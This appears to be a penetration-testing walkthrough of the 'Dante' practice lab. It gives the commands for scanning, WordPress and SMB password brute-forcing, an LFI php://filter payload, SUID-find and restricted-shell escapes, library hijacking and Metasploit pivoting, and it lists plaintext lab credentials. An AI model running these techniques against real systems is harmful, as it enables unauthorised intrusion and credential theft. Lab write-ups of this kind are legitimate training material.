# Dante

## DANTE-WEB-NIX01

Ping sweep to find the machines

```
nmap -sn -T4 10.10.110.0/24
```

Full scan on the found host **10.10.110.100**

```
nmap -T4 -sC -sV -p- --min-rate=1000 10.10.110.100
```

<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

Login on ftp as anonymous to found **todo.txt** inside

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

Inside [**http://10.10.110.100:65000/robots.txt**](http://10.10.110.100:65000/robots.txt) there is another flag and a wordpress link

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

With wpscan we can see that there are some vulns

```
wpscan --url 'http://10.10.110.100:65000/wordpress/'
```

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

And the users

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Now we can try to bruteforce the weak james password

{% code overflow="wrap" %}
```
wpscan --url 'http://10.10.110.100:65000/wordpress/' --passwords /usr/share/wordlists/rockyou.txt
```
{% endcode %}

The creds are James/Toyota. Now modify the theme to get a web shell and then a revshell.

Now we can escalate to James by using the same password from wp (Toyota)

```
su James
```

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

Find has SUID on it

```
./find . -exec /bin/sh -p \; -quit
```

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

Grab the shh root key

## Pivoting

(Simple with ssh -d 9050 )&#x20;

Setup metasploit to pivot throught the network

Upgrade the root ssh to meterpreter session and launch the following commands

```
use multi/manage/autoroute
set session 3
set subnet 172.16.1.0/24
```

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

Then We will use **auxiliary/server/socks\_proxy** to create a proxy server which will allow us to proxy all our traffic from tools like nmap, crackmapexec etc within the meterpreter session.

```
use auxiliary/server/socks_proxy
set SRVPORT 9050
```

and then modify the file `/etc/proxychains4.conf`



To find other ips in the subnet use the module&#x20;

```
use post/multi/gather/ping_sweep
```

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

## DANTE-NIX02

To run nmap throught proxychains

```
proxychains nmap 172.16.1.10 -sT -sV -Pn -T5
```

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

Now open firefox with proxychains

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

As expected there is an LFI in the `nav.php?page=` endpoint

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

On the SMB

<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

### Margaret

Bruteforce the password with the user found with the LFI

{% code overflow="wrap" %}
```
proxychains crackmapexec smb 172.16.1.10 -u user.txt -p /usr/share/wordlists/rockyou.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

and get the file inside

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Let's check if wordress is indeed there (Spoiler: Yes) and try to get the wp-config file

{% code overflow="wrap" %}
```
http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

Now we have ssh access on 172.16.1.10 with a restricted shellls. To escape and get a full shell open vim and launch the following commands

```
:set shell=/bin/bash
:shell
```

On the frank home we find a slack report and some interesting password

* STARS5678FORTUNE401
* 69F15HST1CX
* TractorHeadtorchDeskmat

Now i can su to Franck

### Frank

In the home of frank there is apache\_restart.py.

<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

We can hijack the library urllib by creating it inside the frank's home and let it create a new SUID sh

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

## DANTE-NIX03&#x20;

scan the ports

```
proxychains nmap 172.16.1.10 -sT -sV -Pn -T5
```

<figure><img src="../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

On the webpage there is a directory listing

<figure><img src="../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
